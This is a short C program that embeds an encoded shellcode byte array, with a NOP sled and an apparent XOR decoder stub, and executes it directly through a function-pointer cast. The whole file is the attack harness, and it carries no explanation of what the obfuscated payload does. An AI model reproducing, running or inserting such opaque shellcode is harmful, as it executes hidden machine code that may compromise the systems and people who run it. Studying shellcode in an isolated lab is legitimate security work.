#include <stdio.h>

unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\xda\xc6\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x0e\xb8\x4b\x95\x12\x38\x31\x45\x18\x03\x45\x18\x83\xed\xb7\x77\xe7\x09\x8e\x49\xd3\x9d\xf3\x1a\x47\xac\x73\x30\x83\x77\xea\x97\xf5\xef\x21\x7b\x73\x08\x51\x54\xf0\xbf\xa1\xc2\xd9\x5d\xc8\x7c\xaf\x41\x58\x69\xa7\x85\x5c\x69\x97\xe7\x35\x07\xc8\x94\xad\xd7\x41\x08\xa4\x39\xa0\x2e";

int  main()
{
    ((void(*)(void))&shellcode)();
}

